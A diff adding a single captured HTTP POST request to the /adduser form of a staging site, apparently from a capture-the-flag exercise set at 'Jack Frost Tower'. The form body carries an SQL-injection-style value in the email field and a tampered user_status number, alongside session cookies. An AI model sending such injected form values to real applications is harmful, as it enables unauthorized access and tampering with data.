@@ -1,0 +1,19 @@
+POST /adduser HTTP/2
+Host: staging.jackfrosttower.com
+Cookie: _csrf=JSjHjmind-t3npVPXQW5LloL; connect.sid=s%3A-fFEs8EKJbVqqUnCAP8K-7ebkTyne3xU.ZVY%2Ff4LOWS0l8c9%2FhXKcchqZ0SJPqCrBN10r0K%2BtiNE
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 113
+Origin: https://staging.jackfrosttower.com
+Referer: https://staging.jackfrosttower.com/adduser
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+_csrf=7X9VMI93-VfS5XhZFeW6h92kAgKAvGiJ7Ka4&fullname=4&email='#;--&password=test&user_status=999999999&submit=SAVE
